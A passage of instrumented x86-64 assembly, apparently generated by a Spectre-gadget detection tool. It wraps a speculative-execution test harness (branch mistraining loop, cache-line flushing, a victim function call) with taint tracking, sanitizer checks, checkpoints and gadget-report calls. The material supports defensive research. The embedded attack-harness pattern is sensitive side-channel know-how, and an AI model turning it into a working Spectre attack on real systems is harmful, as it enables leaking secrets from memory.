            je .L__asan_check__teapot___701

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__asan_check__teapot___701:

            movq %r13,%rbp
            shrq $3,%rbp
            movb 2147450880(%rbp),%bpl
            testb %bpl,%bpl
            je .L__mem_operand_policy_done__teapot___701
.L__asan_check_fail__teapot___701:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___701
.L__asan_check_fail_attacker__teapot___701:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___701
.L__asan_check_fail_non_attacker__teapot___701:

            orb $2,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___701:

            nop
            leaq 88(%rsp),%r12
            btcq $45,%r12
            xorl %ebp,%ebp
            orb (dift_reg_tags+6),%bpl
            orb (%r12),%bpl
            movb %bpl,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___702

            movb (dift_reg_queued_tag),%bpl
            movzbq (dift_reg_queued_id),%r13
            orb %bpl,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___702:

            nop
            movq 88(%rsp),%rdi
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq free@PLT
.L__ret_transform_target_attacker_function__b2ead161_26db_4715_aabe_0cdf4bc90288__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $15,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___706:

            nop
            movl $0,%eax
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq (instruction_cnt),%r12
            addq $2,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            callq array_init__teapot__
.L__ret_transform_target_attacker_function__deb7c6f2_21d5_4961_84b4_5f92cf40e671__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $20,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            orb (dift_reg_tags),%dl
            leaq 88(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rdx,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___710:

            nop
            leaq 88(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,88(%rsp)
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___712:

            nop
            movl $90,%edx
            leaq 48(%rsp),%rsi
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___713

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___713:

            testb $2,%r12b
            je .L__asan_check__teapot___713

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $4,(dift_reg_queued_id)
.L__asan_check__teapot___713:

            movq %rsi,%r13
            shrq $3,%r13
            movb 2147450880(%r13),%r13b
            testb %r13b,%r13b
            je .L__mem_operand_policy_done__teapot___713

            movb %sil,%bpl
            andb $7,%bpl
            addb $3,%bpl
            cmpb %r13b,%bpl
            jl .L__mem_operand_policy_done__teapot___713
.L__asan_check_fail__teapot___713:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___713
.L__asan_check_fail_attacker__teapot___713:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $4,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___713
.L__asan_check_fail_non_attacker__teapot___713:

            orb $2,(dift_reg_queued_tag)
            movb $4,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___713:

            nop
            leaq 48(%rsp),%r12
            btcq $45,%r12
            xorl %r13d,%r13d
            orb (dift_reg_tags+6),%r13b
            orb (%r12),%r13b
            movb %r13b,(dift_reg_tags+4)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___714

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%rsi
            orb %r13b,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___714:

            nop
            movl 48(%rsp),%esi
            leaq 52(%rsp),%r13
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___715

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___715:

            testb $2,%r12b
            je .L__asan_check__teapot___715

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__asan_check__teapot___715:

            movq %r13,%rbp
            shrq $3,%rbp
            movb 2147450880(%rbp),%bpl
            testb %bpl,%bpl
            je .L__mem_operand_policy_done__teapot___715

            movb %r13b,%dil
            andb $7,%dil
            addb $3,%dil
            cmpb %bpl,%dil
            jl .L__mem_operand_policy_done__teapot___715
.L__asan_check_fail__teapot___715:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___715
.L__asan_check_fail_attacker__teapot___715:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___715
.L__asan_check_fail_non_attacker__teapot___715:

            orb $2,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___715:

            nop
            leaq 52(%rsp),%r12
            btcq $45,%r12
            xorl %ebp,%ebp
            orb (dift_reg_tags+6),%bpl
            orb (%r12),%bpl
            movb %bpl,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___716

            movb (dift_reg_queued_tag),%bpl
            movzbq (dift_reg_queued_id),%r13
            orb %bpl,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___716:

            nop
            movl 52(%rsp),%edi
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq (instruction_cnt),%r12
            addq $5,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            callq otherArray_init__teapot__
.L__ret_transform_target_attacker_function__31500b1f_dd7d_45c8_8bf8_60e62467f1b2__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $28,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            orb (dift_reg_tags),%dl
            leaq 40(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rdx,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___720:

            nop
            leaq 40(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,40(%rsp)
            xorl %r12d,%r12d
            leaq 56(%rsp),%rsi
            btcq $45,%rsi
            orb (%rsi),%r12b
            testb $48,%r12b
            je .L__check_ok__teapot___722

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___722:

            nop
            leaq 56(%rsp),%rsi
            btcq $45,%rsi
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            orb (%rsi),%dl
            movabsq $72340172838076673,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rdx,(%rsi)
            addq $8,%rsi
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___723

            movb (dift_reg_queued_tag),%dl
            movzbq (dift_reg_queued_id),%r13
            orb %dl,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___723:

            nop
            leaq 56(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq (instruction_cnt),%r12
            addq $3,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            subq $1,56(%rsp)
            leaq (.__trampoline__ef3bf9f5_b46a_4d7a_9b10_8b9b47f68315__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___726)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__ef3bf9f5_b46a_4d7a_9b10_8b9b47f68315__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___726:

            nop
            je .L_1a9b__teapot__
.L__trampoline_target__7f91e847_4eef_40c6_b80c_0925e8a4b959__teapot__:
.L_19cd__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $37,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___728:

            nop
            movl $256,%edx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___729:

            nop
            movl $4096,%esi
            xorl %r13d,%r13d
            orb (dift_reg_tags+15),%r13b
            movb %r13b,(dift_reg_tags+5)
.L__dift_done__teapot___730:

            nop
            movq %r15,%rdi
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq (instruction_cnt),%r12
            addq $4,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            callq flush_lines__teapot__
.L__ret_transform_target_attacker_function__b19b3c19_e5c0_4fd6_8f50_eef720d5cc77__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $44,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            clflush (array_size)(%rip)
            leaq 64(%rsp),%rsi
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___734

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___734:

            testb $2,%r12b
            je .L__asan_check__teapot___734

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $12,(dift_reg_queued_id)
.L__asan_check__teapot___734:

            movq %rsi,%r13
            shrq $3,%r13
            movb 2147450880(%r13),%r13b
            testb %r13b,%r13b
            je .L__mem_operand_policy_done__teapot___734
.L__asan_check_fail__teapot___734:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___734
.L__asan_check_fail_attacker__teapot___734:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $12,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___734
.L__asan_check_fail_non_attacker__teapot___734:

            orb $2,(dift_reg_queued_tag)
            movb $12,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___734:

            nop
            leaq 64(%rsp),%r12
            btcq $45,%r12
            xorl %r13d,%r13d
            orb (dift_reg_tags+6),%r13b
            orb (%r12),%r13b
            movb %r13b,(dift_reg_tags+12)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___735

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%rsi
            orb %r13b,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___735:

            nop
            movq 64(%rsp),%r12
            leaq 8(%rsp),%r13
            xorq %rsi,%rsi
            orb (dift_reg_tags+6),%sil
            testb $48,%sil
            je .L__attacker_tags_check__teapot___736

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___736:

            testb $2,%sil
            je .L__asan_check__teapot___736

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $1,(dift_reg_queued_id)
.L__asan_check__teapot___736:

            movq %r13,%rdx
            shrq $3,%rdx
            movb 2147450880(%rdx),%dl
            testb %dl,%dl
            je .L__mem_operand_policy_done__teapot___736
.L__asan_check_fail__teapot___736:

            testb $1,%sil
            je .L__asan_check_fail_non_attacker__teapot___736
.L__asan_check_fail_attacker__teapot___736:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $1,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___736
.L__asan_check_fail_non_attacker__teapot___736:

            orb $2,(dift_reg_queued_tag)
            movb $1,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___736:

            nop
            leaq 8(%rsp),%rsi
            btcq $45,%rsi
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            orb (%rsi),%dl
            movb %dl,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___737

            movb (dift_reg_queued_tag),%dl
            movzbq (dift_reg_queued_id),%r13
            orb %dl,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___737:

            nop
            movq 8(%rsp),%rbx
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags+7)
.L__dift_done__teapot___738:

            nop
            movl $0,%ebp
            xorl %r13d,%r13d
            orb (dift_reg_tags+6),%r13b
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___739:

            nop
            leaq 88(%rsp),%rax
            xorl %r8d,%r8d
            orb (dift_reg_tags+6),%r8b
            orb (dift_reg_tags),%r8b
            leaq (%rsp),%r13
            btcq $45,%r13
            movabsq $72340172838076673,%rdx
            imulq %rdx,%r8
            movq (memory_history_top),%rsi
            movq (%r13),%rdx
            movq %r13,(%rsi)
            movq %rdx,8(%rsi)
            leaq 16(%rsi),%rsi
            movq %rsi,(memory_history_top)
            movq %r8,(%r13)
            addq $8,%r13
.L__dift_done__teapot___740:

            nop
            leaq (%rsp),%r13
            movq (memory_history_top),%rsi
            movq (%r13),%rdx
            movq %r13,(%rsi)
            movq %rdx,8(%rsi)
            leaq 16(%rsi),%rsi
            movq %rsi,(memory_history_top)
            movq (instruction_cnt),%rsi
            addq $6,%rsi
            cmpq $250,%rsi
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rsi,(instruction_cnt)
            movq %rax,(%rsp)
.L_19fe__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $50,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            mfence 
            lfence 
            xorl %r13d,%r13d
            orb (dift_reg_tags+12),%r13b
            movb %r13b,(dift_reg_tags+8)
.L__dift_done__teapot___745:

            nop
            movl %r12d,%r8d
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___746:

            nop
            movl $4096,%ecx
            xorl %esi,%esi
            orb (dift_reg_tags+1),%sil
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___747:

            nop
            movl %ebx,%edx
            xorl %esi,%esi
            orb (dift_reg_tags+15),%sil
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___748:

            nop
            movq %r15,%rsi
            leaq (%rsp),%r13
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___749

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___749:

            testb $2,%r12b
            je .L__asan_check__teapot___749

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__asan_check__teapot___749:

            movq %r13,%rdi
            shrq $3,%rdi
            movb 2147450880(%rdi),%dil
            testb %dil,%dil
            je .L__mem_operand_policy_done__teapot___749
.L__asan_check_fail__teapot___749:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___749
.L__asan_check_fail_attacker__teapot___749:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___749
.L__asan_check_fail_non_attacker__teapot___749:

            orb $2,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___749:

            nop
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %edi,%edi
            orb (dift_reg_tags+6),%dil
            orb (%r12),%dil
            movb %dil,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___750

            movb (dift_reg_queued_tag),%dil
            movzbq (dift_reg_queued_id),%r13
            orb %dil,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___750:

            nop
            movq (%rsp),%rdi
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbx
            movq %r13,(%r12)
            movq %rbx,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            callq victim_function__teapot__
.L__ret_transform_target_attacker_function__c362d663_c2e2_43fc_a017_845a8fca99b0__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $59,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags)
.L__dift_done__teapot___753:

            nop
            xorq %rax,%rax
            addq $1,%rbp
            xorl %r12d,%r12d
            orb (dift_reg_tags+7),%r12b
            testb $48,%r12b
            je .L__check_ok__teapot___754

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___754:

            nop
            movq (instruction_cnt),%r12
            addq $4,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            cmpq $32,%rbp
            leaq (.__trampoline__b8e70c93_4c51_48a8_b0b2_7b514a43b309__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___756)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__b8e70c93_4c51_48a8_b0b2_7b514a43b309__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___756:

            nop
            je .L_192f__teapot__
.L__trampoline_target__3453da8d_f0d7_4ce6_8fb5_5a0d3afaea11__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $18,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+7),%sil
            movb %sil,(dift_reg_tags+13)
.L__dift_done__teapot___758:

            nop
            movq %rbp,%r13
            andl $31,%r13d
            cmpq $31,%r13
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags)
.L__dift_done__teapot___759:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            sete %al
            movzbl %al,%eax
            xorl %esi,%esi
            orb (dift_reg_tags),%sil
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___760:

            nop
            movq %rax,%rdx
            negq %rdx
            subq $1,%rax
            leaq 32(%rsp),%rsi
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___761

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___761:

            testb $2,%r12b
            je .L__asan_check__teapot___761

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $12,(dift_reg_queued_id)
